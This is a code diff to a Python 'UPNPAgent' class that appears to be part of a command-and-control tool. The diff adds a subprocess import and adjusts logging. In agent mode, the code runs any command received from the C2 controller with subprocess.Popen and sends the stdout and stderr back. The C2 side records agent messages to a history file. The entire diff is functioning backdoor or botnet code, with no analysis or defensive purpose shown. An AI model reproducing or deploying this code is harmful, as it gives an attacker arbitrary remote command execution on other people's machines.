@@ -4,6 +4,7 @@ import argparse
 import logging
 import os
 import queue
+import subprocess
 import sys
 import threading
 import time
@@ -107,7 +108,6 @@ class UPNPAgent:
         return False
 
     def process_message(self, agent_ip: str, message: bytes):
-        print(message)
         command = message[0]
         message_content = message[1:]
         if self.is_c2:
@@ -116,12 +116,13 @@ class UPNPAgent:
                 open('message_history.txt', 'a+', encoding='utf8').write(f"{agent_ip} -> {message_content}\n")
         elif not self.is_c2:
             if command == ord('c'):
+                print("Received C2 Command ", message_content.decode('utf8'))
                 command_args = message_content.decode('utf8').split()
                 process = subprocess.Popen(command_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                 stdout, stderr = process.communicate()
                 self.queue_message((stdout + "\n" + stderr + "\n").encode('utf8'))
             elif command == ord('m'):
-                print("Received C2 Message %s", message_content.decode('utf8'))
+                print("Received C2 Message ", message_content.decode('utf8'))
             
 
     def _start_agent_search(self):
